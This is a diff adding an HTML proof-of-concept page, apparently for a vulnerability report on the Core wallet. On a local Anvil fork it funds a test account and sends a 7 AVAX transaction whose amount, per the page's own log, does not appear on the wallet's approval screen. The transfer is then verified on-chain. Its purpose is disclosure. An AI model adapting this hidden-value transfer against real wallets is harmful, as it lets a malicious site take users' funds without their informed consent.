@@ -1,0 +1,184 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Native Value PoC</title>
+<style>
+body{max-width:720px;margin:20px auto;padding:0 14px;font:15px system-ui}
+input,button{width:100%;box-sizing:border-box;padding:10px;margin:5px 0}
+pre{white-space:pre-wrap;overflow-wrap:anywhere;background:#111;color:#eee;padding:10px}
+</style>
+
+<h2>nNative Value PoC</h2>
+<p>Local Anvil only: chain 31337, 10 AVAX test balance, 7 AVAX transfer.</p>
+<input id="rpcUrl" placeholder="https://YOUR-NGROK.ngrok-free.app">
+<button id="connect">1. Connect</button>
+<button id="setup" disabled>2. Add local chain + fund</button>
+<button id="send" disabled>3. Send hidden 7 AVAX</button>
+<p id="status">Ready...</p>
+<pre id="log"></pre>
+
+<script>
+'use strict';
+
+const PLATFORM = 'ios + andro';
+const CHAIN_ID = '0x7a69';
+const NETWORK_NAME = 'Avalanche C-Chain Local Fork';
+const SYMBOL = 'AVAX';
+const FUND = 10n * 10n ** 18n;
+const VALUE = 7n * 10n ** 18n;
+const TO = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8';
+
+let account = '';
+let rpcUrl = '';
+let rpcId = 1;
+
+const $ = id => document.getElementById(id);
+const hex = value => '0x' + BigInt(value).toString(16);
+const same = (a, b) => String(a || '').toLowerCase() === String(b || '').toLowerCase();
+
+function amount(value) {
+  const n = BigInt(value);
+  const whole = n / 10n ** 18n;
+  const fraction = (n % 10n ** 18n).toString().padStart(18, '0').replace(/0+$/, '');
+  return fraction ? whole + '.' + fraction : String(whole);
+}
+
+function out(name, value) {
+  $('log').textContent += name + '= ' +
+    (typeof value === 'object' ? JSON.stringify(value, null, 2) : value) + '\n';
+}
+
+function wallet(method, params = []) {
+  if (!window.ethereum?.request) throw Error('Core provider not found');
+  return window.ethereum.request({ method, params });
+}
+
+async function rpc(method, params = []) {
+  const response = await fetch(rpcUrl, {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ jsonrpc: '2.0', id: rpcId++, method, params })
+  });
+  const json = await response.json();
+  if (json.error) throw Error(json.error.message);
+  return json.result;
+}
+
+function readRpcUrl() {
+  const url = new URL($('rpcUrl').value.trim());
+  if (url.protocol !== 'https:') throw Error('Use an HTTPS tunnel to local Anvil');
+  return url.href.replace(/\/$/, '');
+}
+
+async function waitReceipt(hash) {
+  for (let i = 0; i < 60; i++) {
+    const receipt = await rpc('eth_getTransactionReceipt', [hash]);
+    if (receipt) return receipt;
+    await new Promise(resolve => setTimeout(resolve, 500));
+  }
+  throw Error('Receipt timeout');
+}
+
+async function run(button, task) {
+  button.disabled = true;
+  try {
+    await task();
+  } catch (error) {
+    $('status').textContent = 'ERROR: ' + error.message;
+    out('ERROR', error.message);
+    button.disabled = false;
+  }
+}
+
+$('connect').onclick = () => run($('connect'), async () => {
+  account = (await wallet('eth_requestAccounts'))[0];
+  if (!/^0x[0-9a-fA-F]{40}$/.test(account || '')) throw Error('Invalid account');
+  if (same(account, TO)) throw Error('Connected account must differ from recipient');
+
+  out('PLATFORM', PLATFORM);
+  out('CONNECTED_ACCOUNT', account);
+  $('setup').disabled = false;
+  $('status').textContent = 'Connected.';
+});
+
+$('setup').onclick = () => run($('setup'), async () => {
+  rpcUrl = readRpcUrl();
+  const rpcChain = await rpc('eth_chainId');
+  if (!same(rpcChain, CHAIN_ID)) throw Error('RPC must report chain 0x7a69');
+
+  await wallet('wallet_addEthereumChain', [{
+    chainId: CHAIN_ID,
+    chainName: NETWORK_NAME,
+    nativeCurrency: { name: SYMBOL === 'AVAX' ? 'Avalanche' : 'Test Ether', symbol: SYMBOL, decimals: 18 },
+    rpcUrls: [rpcUrl],
+    isTestnet: true
+  }]);
+  await wallet('wallet_switchEthereumChain', [{ chainId: CHAIN_ID }]);
+
+  const walletChain = await wallet('eth_chainId');
+  if (!same(walletChain, CHAIN_ID)) throw Error('Core did not switch to chain 0x7a69');
+
+  await rpc('anvil_setBalance', [account, hex(FUND)]);
+  const funded = await rpc('eth_getBalance', [account, 'latest']);
+  if (BigInt(funded) !== FUND) throw Error('Funding mismatch');
+
+  out('RPC_URL', rpcUrl);
+  out('NETWORK', NETWORK_NAME);
+  out('CHAIN_MATCH', same(rpcChain, walletChain));
+  out('FUNDED_BALANCE_' + SYMBOL, amount(funded));
+  $('send').disabled = false;
+  $('status').textContent = 'Ready for button 3.';
+});
+
+$('send').onclick = () => run($('send'), async () => {
+  if (!same(await wallet('eth_chainId'), CHAIN_ID)) throw Error('Wrong Core chain');
+  if (!same(await rpc('eth_chainId'), CHAIN_ID)) throw Error('Wrong RPC chain');
+
+  const senderBefore = BigInt(await rpc('eth_getBalance', [account, 'latest']));
+  const recipientBefore = BigInt(await rpc('eth_getBalance', [TO, 'latest']));
+  const tx = { from: account, to: TO, value: hex(VALUE), gas: '0x5208', data: '0x' };
+
+  out('DAPP_REQUEST_METHOD', 'eth_sendTransaction');
+  out('DAPP_REQUEST', tx);
+  out('DECODED_VALUE', '7 ' + SYMBOL);
+  out('UI_MANUAL_CHECK', 'Network fee shown; Amount/Value/7 ' + SYMBOL + ' absent');
+  $('status').textContent = 'Capture the Core approval UI, then Approve this local transaction.';
+
+  const responseHash = await wallet('eth_sendTransaction', [tx]);
+  out('CORE_RESPONSE_TX_HASH', responseHash);
+
+  const receipt = await waitReceipt(responseHash);
+  const mined = await rpc('eth_getTransactionByHash', [responseHash]);
+  const senderAfter = BigInt(await rpc('eth_getBalance', [account, 'latest']));
+  const recipientAfter = BigInt(await rpc('eth_getBalance', [TO, 'latest']));
+
+  const recipientDelta = recipientAfter - recipientBefore;
+  const senderDebit = senderBefore - senderAfter;
+  const checks = {
+    RECEIPT_SUCCESS: receipt.status === '0x1',
+    RESPONSE_HASH_MATCH: same(responseHash, mined.hash) && same(responseHash, receipt.transactionHash),
+    FROM_MATCH: same(tx.from, mined.from),
+    TO_MATCH: same(tx.to, mined.to),
+    VALUE_MATCH: BigInt(mined.value) === VALUE,
+    DATA_MATCH: same(tx.data, mined.input),
+    CHAIN_MATCH: same(mined.chainId, CHAIN_ID),
+    RECIPIENT_DELTA_MATCH: recipientDelta === VALUE,
+    SENDER_DEBIT_MATCH: senderDebit >= VALUE
+  };
+
+  out('RECEIPT_STATUS', receipt.status);
+  out('MINED_TX_HASH', mined.hash);
+  out('MINED_VALUE_HEX', mined.value);
+  out('MINED_VALUE_' + SYMBOL, amount(mined.value));
+  out('RECIPIENT_DELTA_' + SYMBOL, amount(recipientDelta));
+  out('SENDER_DEBIT_' + SYMBOL, amount(senderDebit));
+
+  for (const [name, passed] of Object.entries(checks)) out(name, passed ? 'PASS' : 'FAIL');
+
+  const passed = Object.values(checks).every(Boolean);
+  out('AUTOMATED_MATCHING_PROOF', passed ? 'PASS (9/9)' : 'FAIL');
+  $('status').textContent = passed
+    ? 'ON-CHAIN PASS: Core response, mined transaction, and balances match exactly.'
+    : 'VALIDATION FAILED';
+});
+</script>
